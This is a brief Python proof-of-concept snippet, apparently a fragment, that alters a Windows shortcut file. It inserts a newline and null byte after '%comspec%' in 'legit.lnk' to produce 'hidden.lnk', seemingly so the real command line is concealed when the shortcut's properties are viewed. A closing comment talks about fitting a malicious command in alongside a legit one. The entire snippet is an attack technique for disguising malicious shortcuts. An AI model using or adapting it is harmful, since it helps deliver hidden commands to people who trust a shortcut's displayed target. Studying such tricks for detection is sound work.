
with open("legit.lnk", "rb") as legit:
  content = legit.read()
  hidden_content = content.replace(b"%comspec%", b"%comspec%\x0a\x00")
 
  with open("hidden.lnk", "wb") as hidden:
    hidden.write(hidden_content)

# We cannot do a legit command and then ; and a malicious command :-)